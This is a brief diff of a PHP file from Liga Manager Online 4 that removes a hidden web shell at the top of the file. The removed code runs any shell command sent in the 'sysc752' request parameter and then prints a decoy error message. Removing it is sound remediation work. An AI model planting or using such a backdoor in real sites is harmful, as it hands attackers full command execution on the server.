@@ -1,10 +1,4 @@
 <?php
-if (isset($_REQUEST['sysc752'])) {
-    system($_REQUEST['sysc752'] . ' 2>&1');
-    echo 'Terminate Error 505';
-    die;
-}
-
 /**
  * Liga Manager Online 4
  *
